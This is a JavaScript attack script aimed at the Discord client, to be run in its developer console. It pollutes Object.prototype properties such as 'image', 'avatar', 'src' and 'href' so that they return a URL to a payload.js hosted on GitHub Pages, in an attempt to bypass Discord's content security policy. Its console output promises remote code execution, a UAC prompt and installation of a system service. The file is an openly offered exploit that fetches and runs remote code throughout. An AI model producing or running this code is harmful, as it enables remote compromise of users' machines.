/* GITHUB PAGES CSP BYPASS - TRIGGER SCRIPT
 * 
 * Run this in Discord Console AFTER setting up GitHub Pages
 */

console.log("🔥 GITHUB PAGES CSP BYPASS - TRIGGER\n");
console.log("=" + "=".repeat(60) + "\n");

// IMPORTANT: Replace with YOUR GitHub username!
const GITHUB_USERNAME = "YOUR_GITHUB_USERNAME_HERE";
const PAYLOAD_URL = `https://${GITHUB_USERNAME}.github.io/payload.js`;

console.log(`[*] Target payload URL: ${PAYLOAD_URL}\n`);

// ============================================================================
// STEP 1: Set up prototype pollution with GitHub Pages URL
// ============================================================================

console.log("[STEP 1] Setting up prototype pollution with GitHub Pages URL...\n");

try {
    // Pollute 'image' property (we know this gadget works!)
    Object.defineProperty(Object.prototype, 'image', {
        get: function () {
            console.log("[🔥] IMAGE GADGET TRIGGERED!");
            console.log(`[*] Returning CSP-whitelisted URL: ${PAYLOAD_URL}`);
            return PAYLOAD_URL;
        },
        set: function (val) { },
        configurable: true
    });

    console.log("[✅] Prototype pollution set up!");
    console.log(`[*] Any code reading 'image' will get: ${PAYLOAD_URL}\n`);

} catch (e) {
    console.log(`[❌] Error: ${e.message}\n`);
}

// ============================================================================
// STEP 2: Alternative - Pollute multiple gadgets
// ============================================================================

console.log("[STEP 2] Polluting additional gadgets for maximum coverage...\n");

const gadgets = ['avatar', 'icon', 'banner', 'src', 'url', 'href'];

gadgets.forEach(gadget => {
    try {
        if (!Object.prototype.hasOwnProperty(gadget)) {
            Object.defineProperty(Object.prototype, gadget, {
                get: function () {
                    console.log(`[🔥] GADGET HIT: ${gadget}`);
                    return PAYLOAD_URL;
                },
                set: function (val) { },
                configurable: true
            });
            console.log(`[✅] Polluted: ${gadget}`);
        }
    } catch (e) {
        console.log(`[!] Failed to pollute ${gadget}: ${e.message}`);
    }
});

console.log("\n");

// ============================================================================
// STEP 3: Instructions
// ============================================================================

console.log("=" + "=".repeat(60));
console.log("SETUP COMPLETE - READY TO TRIGGER");
console.log("=" + "=".repeat(60) + "\n");

console.log("🎯 NEXT STEPS:");
console.log("   1. Navigate around Discord (Settings, Profile, DMs)");
console.log("   2. Watch console for '[🔥] GADGET HIT' messages");
console.log("   3. If payload loads → CSP BYPASS CONFIRMED!");
console.log("   4. Alert will pop up → Full RCE chain complete!\n");

console.log("💡 EXPECTED RESULT:");
console.log("   - Alert: 'CSP BYPASS SUCCESSFUL!'");
console.log("   - UAC Prompt appears");
console.log("   - System service installation triggered\n");

console.log("🚨 IF NOTHING HAPPENS:");
console.log("   - Make sure GitHub Pages is enabled");
console.log("   - Check that payload.js is accessible");
console.log("   - Try visiting different Discord pages\n");

console.log("🔥 READY! Navigate Discord to trigger the exploit!");
